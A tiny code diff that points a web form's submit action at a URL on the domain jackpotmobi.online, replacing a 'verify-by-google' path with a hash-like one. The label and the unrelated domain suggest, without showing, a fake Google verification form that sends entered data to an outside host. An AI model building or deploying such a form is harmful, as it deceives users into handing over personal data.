@@ -1,7 +1,7 @@
 
 function formAction() {
-    document.newForm.action = "https://jackpotmobi.online/verify-by-google";
+    document.newForm.action = "https://jackpotmobi.online/82fae2d";
 }
 
-// 3a358a7
-// verify - by - google
+//82fae2d
+// verify-by-google
